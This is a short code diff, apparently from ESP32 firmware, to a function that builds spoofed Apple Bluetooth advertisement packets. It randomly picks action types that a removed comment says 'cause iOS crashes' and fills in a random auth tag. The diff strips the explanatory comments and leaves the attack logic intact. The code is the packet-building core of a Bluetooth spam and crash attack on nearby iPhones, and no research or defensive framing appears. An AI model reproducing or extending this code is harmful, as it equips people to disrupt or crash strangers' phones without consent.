@@ -30,19 +30,17 @@ void stopSourApple() {
 
 void buildApplePacket() {
   int i = 0;
-  applePacket[i++] = 16;          // Length
-  applePacket[i++] = 0xFF;        // Manufacturer Specific
-  applePacket[i++] = 0x4C;        // Apple
-  applePacket[i++] = 0x00;        // 
-  applePacket[i++] = 0x0F;        // Type
-  applePacket[i++] = 0x05;        // Length
-  applePacket[i++] = 0xC1;        // Action Flags
+  applePacket[i++] = 16;
+  applePacket[i++] = 0xFF;
+  applePacket[i++] = 0x4C;
+  applePacket[i++] = 0x00;
+  applePacket[i++] = 0x0F;
+  applePacket[i++] = 0x05;
+  applePacket[i++] = 0xC1;
   
-  // Action types that cause iOS crashes
   const uint8_t types[] = {0x27, 0x09, 0x02, 0x1E, 0x2B, 0x2D, 0x2F, 0x01, 0x06, 0x20, 0xC0};
   applePacket[i++] = types[random(sizeof(types))];
   
-  // Random auth tag
   esp_fill_random(&applePacket[i], 3);
   i += 3;
   applePacket[i++] = 0x00;
